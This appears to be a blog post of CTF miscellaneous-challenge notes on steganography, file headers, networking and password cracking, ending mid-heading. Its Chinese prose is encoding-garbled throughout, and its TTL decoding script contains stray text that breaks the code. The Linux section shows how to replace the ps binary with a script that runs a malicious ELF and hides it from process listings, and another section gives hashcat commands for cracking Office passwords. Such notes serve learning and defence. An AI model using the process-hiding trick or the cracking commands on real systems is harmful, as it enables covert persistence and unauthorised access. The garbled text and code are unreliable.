    <content type="html"><![CDATA[<h2 id="Logoè¯­è¨€"><a href="#Logoè¯­è¨€" class="headerlink" title="Logoè¯­è¨€"></a>Logoè¯­è¨€</h2><p><a href="https://www.calormen.com/jslogo/">Logoè§£é‡Šå™¨ (calormen.com)</a></p><p><strong>Logoè¯­è¨€ï¼š</strong> Logoè¯­è¨€æ˜¯ä¸€ç§ç®€å•çš„å›¾å½¢åŒ–ç¼–ç¨‹è¯­è¨€ï¼Œä¸»è¦ç”¨äºå„¿ç«¥ç¼–ç¨‹å¯è’™æ•™è‚²ã€‚æ ¸å¿ƒç‰¹ç‚¹æ˜¯â€œæµ·é¾Ÿå›¾å½¢â€ã€‚</p><p><strong>ä»£ç ç¤ºä¾‹ï¼š</strong></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">cs pu lt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 500 </span>rt<span class="hljs-number"> 90 </span>pd fd<span class="hljs-number"> 100 </span>rt<span class="hljs-number"> 90 </span>repeat 18[fd<span class="hljs-number"> 5 </span>rt 10] lt<span class="hljs-number"> 135 </span>fd<span class="hljs-number"> 50 </span>lt<span class="hljs-number"> 135 </span>pu bk<span class="hljs-number"> 100 </span>pd setcolor pick [ red orange yellow green blue violet ] repeat 18[fd<span class="hljs-number"> 5 </span>rt 10] rt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 60 </span>rt<span class="hljs-number"> 90 </span>bk<span class="hljs-number"> 30 </span>rt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 60 </span>pu lt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 100 </span>pd rt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 50 </span>bk<span class="hljs-number"> 50 </span>setcolor pick [ red orange yellow green blue violet ] lt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 50 </span>rt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 50 </span>pu fd<span class="hljs-number"> 50 </span>pd fd<span class="hljs-number"> 25 </span>bk<span class="hljs-number"> 50 </span>fd<span class="hljs-number"> 25 </span>rt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 50 </span>pu setcolor pick [ red orange yellow green blue violet ] fd<span class="hljs-number"> 100 </span>rt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 30 </span>rt<span class="hljs-number"> 45 </span>pd fd<span class="hljs-number"> 50 </span>bk<span class="hljs-number"> 50 </span>rt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 50 </span>bk<span class="hljs-number"> 100 </span>fd<span class="hljs-number"> 50 </span>rt<span class="hljs-number"> 45 </span>pu fd<span class="hljs-number"> 50 </span>lt<span class="hljs-number"> 90 </span>pd fd<span class="hljs-number"> 50 </span>bk<span class="hljs-number"> 50 </span>rt<span class="hljs-number"> 90 </span>setcolor pick [ red orange yellow green blue violet ] fd<span class="hljs-number"> 50 </span>pu lt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 100 </span>pd fd<span class="hljs-number"> 50 </span>rt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 25 </span>bk<span class="hljs-number"> 25 </span>lt<span class="hljs-number"> 90 </span>bk<span class="hljs-number"> 25 </span>rt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 25 </span>setcolor pick [ red orange yellow green blue violet ] pu fd<span class="hljs-number"> 25 </span>lt<span class="hljs-number"> 90 </span>bk<span class="hljs-number"> 30 </span>pd rt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 25 </span>pu fd<span class="hljs-number"> 25 </span>lt<span class="hljs-number"> 90 </span>pd fd<span class="hljs-number"> 50 </span>bk<span class="hljs-number"> 25 </span>rt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 25 </span>lt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 25 </span>bk<span class="hljs-number"> 50 </span>pu bk<span class="hljs-number"> 100 </span>lt<span class="hljs-number"> 90 </span>setcolor pick [ red orange yellow green blue violet ] fd<span class="hljs-number"> 100 </span>pd rt<span class="hljs-number"> 90 </span>arc<span class="hljs-number"> 360 </span>20 pu rt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 50 </span>pd arc<span class="hljs-number"> 360 </span>15 pu fd<span class="hljs-number"> 15 </span>setcolor pick [ red orange yellow green blue violet ] lt<span class="hljs-number"> 90 </span>pd bk<span class="hljs-number"> 50 </span>lt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 25 </span>pu home bk<span class="hljs-number"> 100 </span>lt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 100 </span>pd arc<span class="hljs-number"> 360 </span>20 pu home<br></code></pre></td></tr></table></figure><h2 id="å‹ç¼©åŒ…æ˜æ–‡æ”»å‡»"><a href="#å‹ç¼©åŒ…æ˜æ–‡æ”»å‡»" class="headerlink" title="å‹ç¼©åŒ…æ˜æ–‡æ”»å‡»"></a>å‹ç¼©åŒ…æ˜æ–‡æ”»å‡»</h2><p><strong>æ¡ä»¶ï¼š</strong></p><ul><li><p>åŠ å¯†å‹ç¼©åŒ…</p></li><li><p>æœªåŠ å¯†å‹ç¼©åŒ…</p></li><li><p>ä¸”ä¸¤ä¸ªå‹ç¼©åŒ…å«æœ‰CRCç›¸åŒçš„æ–‡ä»¶</p></li></ul><p>å³å¯ä½¿ç”¨ARCHPRå·¥å…·è¿›è¡Œæ˜æ–‡æ”»å‡»</p><h2 id="TTLéšå†™"><a href="#TTLéšå†™" class="headerlink" title="TTLéšå†™"></a>TTLéšå†™</h2><p><strong>ç‰¹ç‚¹ï¼š</strong></p><ul><li><p>å¤šä¸ª0~255çš„æ•°å­—</p></li><li><p>å¤§å¤šæ˜¯â€63,127,255â€ç­‰</p></li><li><p>å°†æ•°å­—è½¬æˆ8ä½äºŒè¿›åˆ¶æ•°ï¼Œæ¯ä¸ªæ•°å–å‰ä¸¤ä½ï¼Œæ¯å…«ä½ç»„æˆä¸€ä¸ªéšå†™çš„æ•°å­—</p></li></ul><p><strong>ä»£ç ç¤ºä¾‹ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><br>cnt = <span class="hljs-number">0</span><br>tmp_bin = <span class="hljs-string">&quot;&quot;</span><br>ans = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;C:\\Users\\29226\\Desktop\\BUUctf\\MISC\\ç¬¬4é¡µ\\7\\output2.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;C:\\Users\\29226\\Desktop\\BUUctf\\MISC\\ç¬¬4é¡µ\\7\\attachment.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    total_lines = <span class="hljs-built_in">sum</span>(<span class="hljs-number">1</span> <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f)<br><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;C:\\Users\\29226\\Desktop\\BUUctf\\MISC\\ç¬¬4é¡µ\\7\\attachment.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>), total=total_lines, desc=<span class="hljs-string">&quot;Processing&quot;</span>):<br>    line = line.replace(<span class="hljs-string">&quot;TTL=&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>    num = <span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(line), <span class="hljs-string">&#x27;08b&#x27;</span>)  <span class="hljs-comment"># 8ä½äºŒè¿›åˆ¶æ•°ï¼Œå¦‚â€œ0b11111111â€</span><br>    tmp_bin += num[:<span class="hljs-number">2</span>]<br>    cnt += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> cnt == <span class="hljs-number">4</span>:<br>        cnt = <span class="hljs-number">0</span><br>        m = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(tmp_bin, <span class="hljs-number">2</span>))<br>        ans.write(m)<br>        tmp_bin = <span class="hljs-string">&quot;&quot;</span>  <span class="hljs-comment"># æ¸…ç©ºä»¥è¿›è¡Œä¸‹æ¬¡å¾ªç¯</span><br><br>ans.close()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Successfully!!!&quot;</span>)æ¸…ç©ºä»¥è¿›è¡Œä¸‹æ¬¡å¾ªç¯<br><br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h2 id="é›¶å®½åº¦å­—ç¬¦éšå†™"><a href="#é›¶å®½åº¦å­—ç¬¦éšå†™" class="headerlink" title="é›¶å®½åº¦å­—ç¬¦éšå†™"></a>é›¶å®½åº¦å­—ç¬¦éšå†™</h2><p><strong>äº”ç§å­—ç¬¦ï¼š</strong></p><ul><li><p>é›¶å®½åº¦ç©ºæ ¼ï¼ˆ\u200bï¼‰</p></li><li><p>é›¶å®½åº¦éè¿æ¥ç¬¦ï¼ˆ\u200cï¼‰</p></li><li><p>é›¶å®½åº¦è¿æ¥ç¬¦ï¼ˆ\u200dï¼‰</p></li><li><p>ä»å·¦è‡³å³ä¹¦å†™æ ‡è®°ï¼ˆ\u200eï¼‰</p></li><li><p>ä»å³è‡³å·¦ä¹¦å†™æ ‡è®°ï¼ˆ\u200fï¼‰</p></li></ul><p><strong>ç‰¹ç‚¹ï¼š</strong></p><ul><li>åœ¨txtç­‰æ­£å¸¸æŸ¥çœ‹æ–¹å¼ä¸­ä¸å¯è§ï¼Œä¸æ­£å¸¸æ–‡æœ¬æ— å¼‚ã€‚</li><li>æ— å®½åº¦</li></ul><p><strong>åœ¨çº¿å·¥å…·ï¼š</strong><br><a href="https://330k.github.io/misc_tools/unicode_steganography.html">Unicode Steganography with Zero-Width Characters</a></p><h3 id="åŒºåˆ†ï¼šWhiteSpaceç¼–ç¨‹è¯­è¨€"><a href="#åŒºåˆ†ï¼šWhiteSpaceç¼–ç¨‹è¯­è¨€" class="headerlink" title="åŒºåˆ†ï¼šWhiteSpaceç¼–ç¨‹è¯­è¨€"></a>åŒºåˆ†ï¼šWhiteSpaceç¼–ç¨‹è¯­è¨€</h3><blockquote><p><strong>ç‰¹ç‚¹ï¼š</strong></p><ul><li>åªä½¿ç”¨ç©ºç™½å­—ç¬¦ï¼ˆ<strong>ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦å’Œæ¢è¡Œç¬¦</strong>ï¼‰æ¥ç¼–å†™ä»£ç ã€‚</li><li>ä»ç„¶èƒ½å¤Ÿé€‰ä¸­ï¼Œæœ‰å®½åº¦ã€‚</li></ul><p><strong>åœ¨çº¿è¿è¡Œå·¥å…·ï¼š</strong></p><p><a href="https://www.w3cschool.cn/tryrun/runcode?lang=whitespace">whitespaceåœ¨çº¿è¿è¡Œ,åœ¨çº¿å·¥å…·ï¼Œåœ¨çº¿ç¼–è¯‘IDE_w3cschool</a></p></blockquote><h2 id="M4AéŸ³é¢‘æ–‡ä»¶"><a href="#M4AéŸ³é¢‘æ–‡ä»¶" class="headerlink" title="M4AéŸ³é¢‘æ–‡ä»¶"></a>M4AéŸ³é¢‘æ–‡ä»¶</h2><p><strong>æ–‡ä»¶å¼€å¤´ï¼šï¼ˆä¸MP4ç±»ä¼¼ï¼‰</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> xx <span class="hljs-number">66</span> <span class="hljs-number">74</span> <span class="hljs-number">79</span> <span class="hljs-number">70</span> <span class="hljs-number">4</span>D <span class="hljs-number">34</span> <span class="hljs-number">41</span> <span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p>ï¼ˆMP4ï¼‰ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">20</span> <span class="hljs-number">66</span> <span class="hljs-number">74</span> <span class="hljs-number">79</span> <span class="hljs-number">70</span> <span class="hljs-number">4</span>D <span class="hljs-number">34</span> <span class="hljs-number">56</span> <span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p><strong>å¼€å¤´ç»“æ„ï¼š</strong></p><ul><li><p><code>00 00 00 xx</code> è¡¨ç¤ºæ–‡ä»¶å¤´çš„å¤§å°ï¼ˆ<code>xx</code> æ˜¯ä¸€ä¸ªå˜é‡ï¼Œè¡¨ç¤ºå…·ä½“çš„å­—èŠ‚é•¿åº¦ï¼‰ã€‚</p></li><li><p><code>66 74 79 70</code> æ˜¯ <code>ftyp</code>ï¼ˆfile typeï¼‰çš„ ASCII è¡¨ç¤ºï¼Œç”¨äºæ ‡è¯†æ–‡ä»¶ç±»å‹ã€‚</p></li><li><p><code>4D 34 41 20</code> æ˜¯ <code>M4A</code> çš„ ASCII è¡¨ç¤ºï¼Œæ˜ç¡®æŒ‡å‡ºè¿™æ˜¯ä¸€ä¸ª M4A éŸ³é¢‘æ–‡ä»¶ã€‚</p></li></ul><h2 id="æ±‰ä¿¡ç "><a href="#æ±‰ä¿¡ç " class="headerlink" title="æ±‰ä¿¡ç "></a>æ±‰ä¿¡ç </h2><p><strong>æ¦‚å¿µï¼š</strong></p><ul><li>çŸ©é˜µå¼äºŒç»´æ¡ç ï¼Œç”±ä¸­å›½è‡ªä¸»ç ”å‘ï¼Œæ›´é€‚åˆæ±‰å­—çš„è¡¨ç¤ºã€‚</li></ul><p><strong>ç¤ºä¾‹ï¼š</strong></p><p><img src="/2025/02/28/Misc%E9%9A%8F%E7%AC%94/1.png"></p><p><strong>åœ¨çº¿è¯†åˆ«ï¼š</strong></p><p><a href="https://tuzim.net/hxdecode/">åœ¨çº¿æ±‰ä¿¡ç è¯†åˆ«,æ±‰ä¿¡ç è§£ç  - å…”å­äºŒç»´ç  (tuzim.net)</a></p><h2 id="ELFæ–‡ä»¶"><a href="#ELFæ–‡ä»¶" class="headerlink" title="ELFæ–‡ä»¶"></a>ELFæ–‡ä»¶</h2><p><strong>æ¦‚å¿µï¼š</strong></p><ul><li><strong>ELFï¼ˆExecutable and Linkable Formatï¼‰æ–‡ä»¶</strong>æ˜¯ä¸€ç§ç”¨äºå¯æ‰§è¡Œæ–‡ä»¶ã€ç›®æ ‡ä»£ç ã€å…±äº«åº“å’Œæ ¸å¿ƒè½¬å‚¨çš„æ ‡å‡†æ–‡ä»¶æ ¼å¼ã€‚å®ƒå¹¿æ³›åº”ç”¨äºå¤šç§æ“ä½œç³»ç»Ÿå’Œæ¶æ„ï¼Œå°¤å…¶æ˜¯ç±»Unixç³»ç»Ÿï¼ˆå¦‚Linuxã€FreeBSDç­‰ï¼‰ã€‚</li></ul><p><strong>ç»“æ„ï¼š</strong></p><ul><li><strong>ELFæ–‡ä»¶å¤´ï¼ˆELF Headerï¼‰ï¼š</strong></li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">7F</span> <span class="hljs-number">45</span> <span class="hljs-number">4</span>C <span class="hljs-number">46</span> (.ELF)<br></code></pre></td></tr></table></figure><ul><li><p><strong>ç¨‹åºå¤´è¡¨ï¼ˆProgram Header Tableï¼‰</strong></p></li><li><p><strong>æ®µè¡¨ï¼ˆSection Header Tableï¼‰</strong></p></li><li><p><strong>æ•°æ®åŒº</strong></p></li></ul><p><strong>ç¤ºä¾‹ï¼š</strong></p><ul><li>å¯¹äºELFå¯æ‰§è¡Œæ–‡ä»¶æ¥è¯´ï¼Œå¯åœ¨Linuxç³»ç»Ÿä¸­ç›´æ¥è¿è¡Œã€‚</li></ul><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./ELF_FILE</span><br></code></pre></td></tr></table></figure><h2 id="å‘½ä»¤æ›¿æ¢ï¼ˆLinuxï¼‰"><a href="#å‘½ä»¤æ›¿æ¢ï¼ˆLinuxï¼‰" class="headerlink" title="å‘½ä»¤æ›¿æ¢ï¼ˆLinuxï¼‰"></a>å‘½ä»¤æ›¿æ¢ï¼ˆLinuxï¼‰</h2><p><strong>æ¦‚å¿µï¼š</strong></p><p>æ”»å‡»è€…æ‰¾åˆ°ç³»ç»Ÿå‘½ä»¤æ–‡ä»¶ï¼Œå°†å…¶æ›¿æ¢ä½æ¶æ„è„šæœ¬æˆ–æ–‡ä»¶ï¼ˆä»¥â€œpsâ€å‘½ä»¤ä¸ºä¾‹ï¼‰</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">whereis <span class="hljs-keyword">ps</span><br><span class="hljs-built_in">mkdir</span> .hide_command<br>mv /usr/bin/<span class="hljs-keyword">ps</span> .hide_command/<br><span class="hljs-keyword">vi</span> /usr/bin/<span class="hljs-keyword">ps</span><br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨ <code>/usr/bin/ps</code> ä¸­å†™å…¥æ¶æ„è„šæœ¬ï¼Œå¦‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>/centos_core.elf &amp; /.hide_command/ps | grep -v <span class="hljs-string">&quot;shell&quot;</span> | grep -v <span class="hljs-string">&quot;centos_core&quot;</span> | grep <span class="hljs-string">&quot;bash&quot;</span><br></code></pre></td></tr></table></figure><p>Â Â Â Â è„šæœ¬ä¼šåœ¨æ¯æ¬¡æ‰§è¡Œ <code>ps</code> å‘½ä»¤æ—¶è¿è¡Œä¸€ä¸ªæ¶æ„ç¨‹åºï¼ˆå¦‚ <code>/centos_core.elf</code>ï¼‰ï¼Œå¹¶è¿‡æ»¤æ‰æŸäº›è¿›ç¨‹ä¿¡æ¯ï¼Œä»è€Œéšè—æ¶æ„è¿›ç¨‹ã€‚</p><p><strong>ç‰¹ç‚¹ï¼š</strong></p><ul><li>é€šå¸¸æ˜¯<code>/usr/bin/</code>ä¸­çš„å‘½ä»¤ï¼Œå¦‚â€œpsâ€ç­‰</li></ul><p><strong>æŸ¥è¯¢æ–¹æ³•ï¼š</strong></p><p><code>rpm -Vf /usr/bin/*</code>,å¯æŸ¥è¯¢å‘½ä»¤æ˜¯å¦è¢«ä¿®æ”¹ã€‚</p><h2 id="IPåœ°å€"><a href="#IPåœ°å€" class="headerlink" title="IPåœ°å€"></a>IPåœ°å€</h2><p><strong>æ¦‚å¿µï¼š</strong></p><ul><li><strong>å…¨ç§°ï¼š</strong> Internet Protocol Addressï¼ˆäº’è”ç½‘åè®®åœ°å€ï¼‰</li></ul><p><strong>åŠŸèƒ½ï¼š</strong></p><ul><li><p><strong>æ ‡è¯†è®¾å¤‡ï¼š</strong> æ ‡è¯†ä¸»æœºçš„ç½‘ç»œæ¥å£ï¼Œæä¾›ä¸»æœºåœ¨ç½‘ç»œä¸­çš„ä½ç½®ã€‚</p></li><li><p><strong>ç½‘ç»œå¯»å€ï¼š</strong> å……å½“ç½‘ç»œå¯»å€ä¸­çš„ç›®çš„åœ°ã€‚</p></li></ul><p><strong>ï¼ˆå¸¸ç”¨ï¼‰ç‰ˆæœ¬ï¼š</strong></p><ul><li><p><strong>IPv4ï¼ˆ42äº¿ä¸ªåœ°å€å·²ç”¨å°½ï¼‰ï¼š</strong></p><ul><li><p>32ä½äºŒè¿›åˆ¶æ•°ç»„æˆã€‚XXX.XXX.XXX.XXXï¼ˆXXXä¸ºå°äº255çš„10è¿›åˆ¶æ•°ï¼‰ã€‚</p></li><li><p>Aç±»ï¼š1.0.0.1~127.255.255.254</p></li><li><p>Bç±»ï¼š128.0.0.1~191.255.255.254</p></li><li><p>Cç±»ï¼š192.0.0.1~223.255.255.254</p></li><li><p>Dç±»ï¼šç•™ç»™Internetä½“ç³»ç»“æ„å§”å‘˜ä¼š(IAB)ä½¿ç”¨ã€ç»„æ’­åœ°å€ã€‘</p></li><li><p>Eç±»ï¼šç‰¹æ®Šä¿ç•™åœ°å€ï¼Œå¦‚255.255.255.255ä¸º<strong>å—é™å¹¿æ’­åœ°å€</strong>ï¼Œç”¨æ¥å°†ä¸€ä¸ªåˆ†ç»„ä»¥å¹¿æ’­æ–¹å¼å‘é€ç»™æœ¬ç½‘ç»œä¸­çš„æ‰€æœ‰ä¸»æœºï¼Œè·¯ç”±å™¨åˆ™é˜»æŒ¡è¯¥åˆ†ç»„é€šè¿‡ï¼Œå°†å…¶å¹¿æ’­åŠŸèƒ½é™åˆ¶åœ¨æœ¬ç½‘å†…éƒ¨ã€‚</p></li></ul></li><li><p><strong>IPv6ï¼š</strong></p><ul><li>ç”±128ä½äºŒè¿›åˆ¶ç»„æˆï¼Œä¸€èˆ¬é‡‡ç”¨32ä¸ªåå…­è¿›åˆ¶æ•°è¡¨ç¤ºã€‚</li></ul></li></ul><p><strong>å†…ç½‘ï¼ˆä»¥ä¸‹æƒ…å†µä¸€èˆ¬æ˜¯å†…ç½‘IPåœ°å€ï¼‰ï¼š</strong></p><ul><li><p><strong>Aç±»ç§æœ‰åœ°å€</strong>ï¼š<code>10.0.0.0</code> åˆ° <code>10.255.255.255</code></p></li><li><p><strong>Bç±»ç§æœ‰åœ°å€</strong>ï¼š<code>172.16.0.0</code> åˆ° <code>172.31.255.255</code></p></li><li><p><strong>Cç±»ç§æœ‰åœ°å€</strong>ï¼š<code>192.168.0.0</code> åˆ° <code>192.168.255.255</code></p></li></ul><p><strong>å­ç½‘ï¼š</strong></p><ul><li><p>ç”¨<strong>å­ç½‘æ©ç </strong>å°†IPåœ°å€åˆ†å‰²æˆå¤šä¸ªå­ç½‘ï¼Œæ¯ä¸ªå­ç½‘éƒ½æœ‰è‡ªå·±çš„ç½‘ç»œåœ°å€å’Œå¹¿æ’­åœ°å€ã€‚</p></li><li><p>ç›®çš„æ˜¯å°†ä¸€ä¸ªå¤§çš„ç½‘ç»œåˆ†å‰²æˆå¤šä¸ªå°çš„ç½‘ç»œï¼Œä»¥ä¾¿æ›´é«˜æ•ˆåœ°ç®¡ç†å’Œä½¿ç”¨IPåœ°å€ã€‚</p></li></ul><p><strong>åœ°å€è½¬æ¢ï¼ˆNATï¼‰ï¼š</strong></p><ul><li><p>NATè®¾å¤‡ä¼šå°†ä¸“ç”¨ç½‘ç»œä¸Šçš„ä¸åŒIPåœ°å€æ˜ å°„ä¸ºå…¬å…±äº’è”ç½‘ä¸Šçš„ä¸åŒçš„TCPæˆ–è€…UDPçš„ç«¯å£å·ã€‚</p></li><li><p>åœ¨å®¶ç”¨ç½‘ç»œä¸­ï¼ŒNATåŠŸèƒ½é€šå¸¸æ˜¯åœ¨å®¶åº­ç½‘ç»œçš„ç½‘å…³ä¸­å®ç°çš„ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¿æ¥åˆ°ç½‘å…³çš„è®¡ç®—æœºå…·æœ‰ä¸“ç”¨çš„IPåœ°å€ï¼Œå¹¶ä¸”ç½‘å…³ä¼šåœ¨å¤–éƒ¨æ¥å£ä¸Šè¿›è¡ŒInterneté€šä¿¡ã€‚</p></li><li><p>å†…éƒ¨çš„è®¡ç®—æœºå…±äº«è¿™ä¸€ä¸ªå…¬å…±çš„IPåœ°å€ã€‚</p></li></ul><h2 id="Microsoft-OfficeåŠ å¯†æ–‡æ¡£"><a href="#Microsoft-OfficeåŠ å¯†æ–‡æ¡£" class="headerlink" title="Microsoft OfficeåŠ å¯†æ–‡æ¡£"></a>Microsoft OfficeåŠ å¯†æ–‡æ¡£</h2><p><strong>æ”»å‡»æ–¹æ³•ï¼š</strong> ä½¿ç”¨<strong>office2johnå’Œhashcat</strong>ç ´è§£</p><p><strong>æ­¥éª¤ï¼š</strong></p><ul><li>å…ˆä½¿ç”¨office2johnè·å–åŠ å¯†æ–‡æ¡£çš„hashå€¼</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">python office2john.py /home/kali/Desktop/encrypted &gt; hash.txt<br><br><span class="hljs-comment">#å†åˆ‡å‰²ä¸ºhashcatèƒ½å¤„ç†çš„æ•°æ®æ¨¡å¼</span><br>awk -F <span class="hljs-string">&quot;:&quot;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span> hash.txt &gt; hashcat_use.txt<br></code></pre></td></tr></table></figure><ul><li><p>æŸ¥çœ‹è¾“å‡ºä¸­çš„åŠ å¯†æ–‡ä»¶çš„officeç‰ˆæœ¬</p></li><li><p>ä½¿ç”¨<code>hashcat --help</code> æ‰¾åˆ°officeæ–‡ä»¶å¯¹åº”çš„m<strong>å‚æ•°</strong>ï¼Œå†ä½¿ç”¨hashcatç ´è§£</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hashcat -a 3 -m 9500 hashcat_use.txt  --increment --increment-min 1 --increment-max 8 ?d?d?d?d?d?d?d?d<br></code></pre></td></tr></table></figure><h2 id="æ…¢æ‰«æç”µè§†ï¼ˆsstvï¼‰"><a href="#æ…¢æ‰«æç”µè§†ï¼ˆsstvï¼‰" class="headerlink" title="æ…¢æ‰«æç”µè§†ï¼ˆsstvï¼‰"></a>æ…¢æ‰«æç”µè§†ï¼ˆsstvï¼‰</h2><p><strong>æ…¢æ‰«æç”µè§†</strong>ï¼ˆSlow-scan televisionï¼‰:æ˜¯<a href="https://zh.wikipedia.org/wiki/%E4%B8%9A%E4%BD%99%E6%97%A0%E7%BA%BF%E7%94%B5" title="ä¸šä½™æ— çº¿ç”µ">ä¸šä½™æ— çº¿ç”µ</a>çˆ±å¥½è€…çš„ä¸€ç§ä¸»è¦å›¾ç‰‡ä¼ è¾“æ–¹æ³•ï¼Œæ…¢æ‰«æç”µè§†é€šè¿‡<a href="https://zh.wikipedia.org/wiki/%E6%97%A0%E7%BA%BF%E7%94%B5" title="æ— çº¿ç”µ">æ— çº¿ç”µ</a>ä¼ è¾“å’Œæ¥æ”¶å•è‰²æˆ–å½©è‰²é™æ€å›¾ç‰‡ã€‚</p><p><strong>ç‰¹ç‚¹ï¼š</strong> ä¸šä½™æ— çº¿ç”µæ“ä½œå‘˜é€šå¸¸åœ¨<a href="https://zh.wikipedia.org/wiki/%E7%9F%AD%E6%B3%A2" title="çŸ­æ³¢">çŸ­æ³¢</a>ï¼ˆæˆ–<a href="https://zh.wikipedia.org/wiki/%E9%AB%98%E9%A0%BB" title="é«˜é¢‘">é«˜é¢‘</a>ï¼‰ã€<a href="https://zh.wikipedia.org/wiki/%E7%94%9A%E9%AB%98%E9%A2%91" title="ç”šé«˜é¢‘">ç”šé«˜é¢‘</a>ã€<a href="https://zh.wikipedia.org/wiki/%E8%B6%85%E9%AB%98%E9%A2%91" title="è¶…é«˜é¢‘">è¶…é«˜é¢‘</a>æ³¢æ®µä½¿ç”¨æ…¢æ‰«æç”µè§†ã€‚</p><p><strong>å·¥å…·ï¼š</strong> <strong>qsstv</strong> ï¼ˆè½¯ä»¶ï¼‰ã€RX-SSTV+è™šæ‹Ÿå£°å¡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get install qsstv<br></code></pre></td></tr></table></figure><p><strong>ä½¿ç”¨æ–¹æ³•ï¼š</strong></p><ul><li><p>æ‰“å¼€è½¯ä»¶åï¼Œåœ¨<code>Options-&gt;Configuration-&gt;Sound</code>ä¸­å‹¾é€‰<code>From file</code></p></li><li><p>ç‚¹å‡»<code>start receiver</code>å¼€å§‹æ¥æ”¶ï¼Œé€‰æ‹©éŸ³é¢‘æ–‡ä»¶å°±å¯ä»¥äº†ã€‚</p></li></ul><h2 id="PT2242"><a href="#PT2242" class="headerlink" title="PT2242"></a>PT2242</h2><p><strong>ç”¨é€”ï¼š</strong> ç”¨äº<strong>ç”µå•è½¦</strong>é”è½¦ä¿¡å·</p><p><strong>PT2242ä¿¡å·</strong>ï¼šå‰é¢4bitï¼ˆä¸€èˆ¬ï¼‰è¡¨ç¤ºåŒæ­¥ç ï¼Œä¸­é—´çš„20bitè¡¨ç¤ºåœ°å€ç ï¼Œåé¢çš„4bitè¡¨ç¤ºåŠŸèƒ½ç ï¼Œæœ€åä¸€ä½æ˜¯åœæ­¢ç ã€‚</p><h2 id="æ—¶é—´éšå†™ï¼ˆgifï¼‰"><a href="#æ—¶é—´éšå†™ï¼ˆgifï¼‰" class="headerlink" 